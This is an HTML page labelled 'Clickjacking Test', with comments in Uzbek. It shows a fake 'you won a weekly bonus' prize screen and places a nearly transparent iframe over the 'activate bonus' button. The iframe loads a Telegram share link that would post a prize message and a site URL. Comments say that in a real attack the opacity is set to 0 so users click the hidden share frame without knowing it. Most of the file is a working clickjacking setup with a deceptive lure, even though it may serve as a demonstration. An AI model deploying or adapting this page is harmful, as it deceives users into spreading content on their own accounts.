<!DOCTYPE html>
<html lang="uz">
<head>
    <meta charset="UTF-8">
    <title>Clickjacking Test</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            overflow: hidden;
        }

        /* 1-Qatlam: Foydalanuvchi ko'radigan yolg'on kontent */
        .under-layer {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100vh;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            background-color: #f0f2f5;
            z-index: 1;
        }

        .gift-box {
            width: 200px;
            height: 200px;
            background-color: #e74c3c;
            border-radius: 10px;
            display: flex;
            justify-content: center;
            align-items: center;
            font-size: 80px;
            margin-bottom: 20px;
            box-shadow: 0 10px 20px rgba(0,0,0,0.1);
        }

        .fake-button {
            background-color: #27ae60;
            color: white;
            padding: 15px 40px;
            border: none;
            border-radius: 30px;
            font-size: 20px;
            font-weight: bold;
            cursor: pointer;
            box-shadow: 0 5px 15px rgba(39, 174, 96, 0.4);
        }

        /* 2-Qatlam: Ustki ko'rinmas iframe (Haqiqiy Telegram oynasi) */
        .invisible-iframe {
            position: absolute;
            top: 250px; /* Tugma turgan joyga to'g'irlash kerak */
            left: 50%;
            transform: translateX(-50%);
            width: 300px;
            height: 100px;
            /* Hujum vaqtida opacity: 0 bo'ladi. Hozir ko'rinishi uchun 0.3 qildim */
            opacity: 0.3; 
            border: 2px dashed red;
            z-index: 2;
            cursor: pointer;
        }
    </style>
</head>
<body>

    <!-- Foydalanuvchiga ko'rinadigan qism -->
    <div class="under-layer">
        <div class="gift-box">🎁</div>
        <h1>Tabriklaymiz!</h1>
        <p>Siz haftalik bonus g'olibi bo'ldingiz.</p>
        <button class="fake-button">Bonusni faollashtirish</button>
    </div>

    <!-- Ko'rinmas (shaffof) qilinadigan Telegram havolasi -->
    <!-- Bu yerda Telegramning share funksiyasi ishlatilgan -->
    <iframe 
        class="invisible-iframe" 
        src="https://t.me/share/url?url=https://mysite.uz&text=Men_yutuq_yutdim!">
    </iframe>

    <script>
        // Oddiy tushuntirish:
        // Foydalanuvchi yashil tugmani bosaman deb o'ylaydi, 
        // lekin aslida u qizil chiziq ichidagi (ko'rinmas) Telegram oynasini bosadi.
    </script>
</body>
</html>
